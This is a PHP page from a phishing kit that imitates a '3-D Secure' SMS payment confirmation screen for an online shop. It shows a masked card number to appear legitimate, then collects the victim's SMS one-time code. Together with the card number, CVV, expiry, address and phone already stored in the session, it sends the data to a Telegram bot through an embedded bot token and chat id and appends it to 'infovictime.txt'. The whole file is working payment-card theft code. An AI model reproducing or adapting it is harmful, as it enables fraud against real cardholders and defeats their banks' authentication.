<?php
session_start();




if(  isset($_POST["confirmcodesms"])  )
{	
	
	foreach($_SESSION["infocookiess2"] as $keys => $values)
    {	
	    $datetime=$values["datetime"];
		$ip=$values["ip"];
		$img=$values["img"];
		$title=$values["title"];
		$price=$values["price"];
		$quantity=$values["quantity"];
		$email = $values["email"];
		$firstname = $values["firstname"];
		$lastname = $values["lastname"];
		$address = $values["address"];
		$city = $values["city"];
		$country = $values["country"];
		$postcode = $values["postcode"];
		$phone =$values["phone"];
		$nameoncard = $values["nameoncard"];
		$cardnumber = $values["cardnumber"];
		$expmm = $values["expmm"];
		$expyy = $values["expyy"];
		$cvv = $values["cvv"];		
		
		$codesms = $_POST["codesms"];
    }
	



	
             
	define ('url',"https://api.telegram.org/bot1865501764:AAE6Ep51dlBHRa8ZSk0csxOxrBc1IHJocTw/sendmessage?chat_id=1335982188&");
    $message = urlencode
	(   
		"\n /-- start info victime --/"                               .  
        "\n datetime: "               .   $datetime                   . 		
		"\n ip: "                     .   $ip                         .  
        "\n img: "                    .   $img                        .  
		"\n title: "                  .   $title                      .
		"\n price: "                  .   $price                      .
		"\n quantity: "               .   $quantity                   .
		"\n email: "                  .   $email                      .
		"\n fulname: "                .   $firstname ." ". $lastname  .
		"\n address: "                .   $address                    .
		"\n city: "                   .   $city                       .
		"\n country: "                .   $country                    .
		"\n postcode: "               .   $postcode                   .
		"\n phone: "                  .   $phone                      .
		"\n nameoncard: "             .   $nameoncard                 .
		"\n cardnumber: "             .   $cardnumber                 .
		"\n expdate: "                .   $expmm ."/". $expyy  	      .
		"\n cvv: "                    .   $cvv   		              .
		"\n codesms: "                .   $codesms   		          .
		"\n /-- end info victime --/"                                         		
	);
    file_get_contents(url."text=".$message."");
 
			
    $file = Fopen("infovictime.txt","a+"); 
    fwrite($file ,    "\n /-- star info victime --/"                                  );
	fwrite($file ,    "\n datetime : "            .      $datetime                    ); 
    fwrite($file ,    "\n ip : "                  .      $ip                          ); 
	fwrite($file ,    "\n img : "                 .      $img                         );
	fwrite($file ,    "\n title : "               .      $title                       ); 
	fwrite($file ,    "\n price : "               .      $price                       ); 
	fwrite($file ,    "\n quantity : "            .      $quantity                    ); 
	fwrite($file ,    "\n email : "               .      $email                       ); 
	fwrite($file ,    "\n fulname : "             .      $firstname ." ". $lastname   ); 
	fwrite($file ,    "\n address : "             .      $address                     ); 
	fwrite($file ,    "\n city : "                .      $city                        ); 
	fwrite($file ,    "\n country : "             .      $country                     ); 
	fwrite($file ,    "\n postcode : "            .      $postcode                    ); 
	fwrite($file ,    "\n phone : "               .      $phone                       ); 
	fwrite($file ,    "\n nameoncard : "          .      $nameoncard                  ); 
	fwrite($file ,    "\n cardnumber : "          .      $cardnumber                  ); 
	fwrite($file ,    "\n expdate : "             .      $expmm ."/". $expyy          ); 	
	fwrite($file ,    "\n cvv : "                 .      $cvv                         ); 
	fwrite($file ,    "\n codesms : "             .      $codesms                     ); 	
    fwrite($file ,    "\n /-- end info victime --/"                                   );  
    fwrite($file ,    "\n"                                                            );     
	 

    echo "<script> window.location.href = 'Cube-Porte-Papier-Toilette.php'; </script>"; 

}

?>

<title>Welcome</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
<script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/>  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css"/>   <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"      ></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css"  rel="stylesheet"  > <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.min.js" ></script>
<link rel="shortcut icon" type="image/x-icon" media="all" href="" />
<style>html, body{  padding:0; border:0; margin:0% 0%;  touch-action: manipulation;    user-select: none;   }   ul li {list-style-type:none; text-decoration:none;  }  a{text-decoration:none; }    </style>



<style>
.container1 { background-color:transparent; width:100%; height:auto;   }
	.row1{ background-color:transparent; padding:0% 0%; margin:2% 0%;    display:flex; align-items:flex-start;  align-content:center; justify-content:center; text-align:center;  }       
        .row1 .col1a{width:100%; }   .row1 .col1b{background-color:transparent;   padding:0px 0px; margin:0% 0%;    display:flex; align-items:center; justify-content:flex-end; text-align:left;   }	

	.row2a{background-color:#dadfdd24;  display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center;   }
     .row2b{ background-color:#ffffff61; border:solid 1px #0000002e;   padding:2% 2%; margin:0% 0%; display:grid; align-items:flex-start;  align-content:center; justify-content:center; text-align:center; grid-row-gap:1rem;  } 
     
        .row2a .row2b .col1a{width:100%; }   .row2a .row2b  .col1b{background-color:transparent;   padding:0px 0px; margin:0% 0%;    display:grid; align-items:center; justify-items:flex-start; justify-content:flex-start; text-align:left;   }	
			  .titleinfopayment{color:black; font:800 20px 'cairo';}
			  .infopayment{display:flex; align-items:center; justify-content:center; text-align:center;   }
				   .infopayment span:first-child{ width:111px;  margin-right:2px; color:black; font:600 14px 'cairo';  text-align:left;  }
				   .infopayment span:last-child{  width:200px;  margin-left:5px;  color:black; font:400 14px 'cairo';   text-align:left;  }  
        .row2a .row2b .col2a{width:100%; }   .row2a .row2b  .col2b{background-color:transparent;   padding:0px 0px; margin:0% 0%;    display:grid; align-items:center; justify-items:flex-start; justify-content:center; text-align:left; grid-row-gap:0.3rem;  }	
              .titleconfirme{color:black; font:800 20px 'cairo';}
			  .inputtext{width:200px; }
              .inputsubmit{width:100px; border:solid 1px black; border-radius:3px; }
@media only screen and (max-width:1000px) 
{  
   .row1{display:grid; }
	  .row1 .col1a{width:100%;  }
	  .row1 .col2a{ width:100%; }      
}
	

@media only screen and (max-width:600px) 
{  
}	
</style>	


<form method="post" action="" style="padding:0px; margin:0px;">  
<div class="container1">
  
    <div class="row1">
        <div class="col1a">  <div class="col1b">  
              <div class="creditcard"> info sur 3-D Secure <img src="img/visacard.jpg">  </div>
	    </div></div>
    </div>
	<div class="row2a"> <div class="row2b">
	    <div class="col1a">  <div class="col1b">   	
					<?php						
						if ( !empty( $_SESSION["infocookiess2"] )  )
                        {	                    
							foreach(  $_SESSION["infocookiess2"] as $keys => $values  )
							{   
							    $title =  $values["title"];
								$price =  $values["price"];
								$datetime =  $values["datetime"];
								$cardnumber = substr($values["cardnumber"], 0, 5) . "******" . substr($values["cardnumber"], 11, 5);	
								$phone = substr($values["phone"], 0, 2) . "******" . substr($values["phone"], 8, 2);
							}	
								?>
								
								<div class="titleinfopayment">information about payment </div>
								<div class="infopayment">  <span>Merchant :</span>      <span><?php echo $title ?> <span>                </div>
								<div class="infopayment">  <span>Amouunt :</span>       <span><?php echo $price ?> €</span>                 </div>
								<div class="infopayment">  <span>Date :</span>          <span><?php echo $datetime ?></span> </div>
								<div class="infopayment">  <span>Card number :</span>   <span><?php echo $cardnumber ?>     </div>
								<div class="infopayment">  <span>Phone Number :</span>  <span><?php echo $phone ?></span>            </div>
								<?php
                        }							
					?>	
					
		</div></div>
		<div class="col2a">  <div class="col2b">   
		  <div class="titleconfirme">Confirm payment with SMS code  </div>
		  <div>To confirm the payment, we have send SMS message with a code to your mobile phone number . </div>
		  <div>check the payment details, enter the 6-digit SMS below and click "Confirm" . </div>
		  <div><input type="number" placeholder="Code from SMS" name="codesms" class="inputtext"      required="required"     oninvalid="this.setCustomValidity('Enter a valid code ')"        oninput="setCustomValidity('')" autocomplete="Off" size="40" maxlength="40"    /> </div>
		  <div><input type="submit" value="Confirm"     name="confirmcodesms" class="inputsubmit"/> </div>
		</div></div>	
	</div> </div>

	
</div>
</form> 


















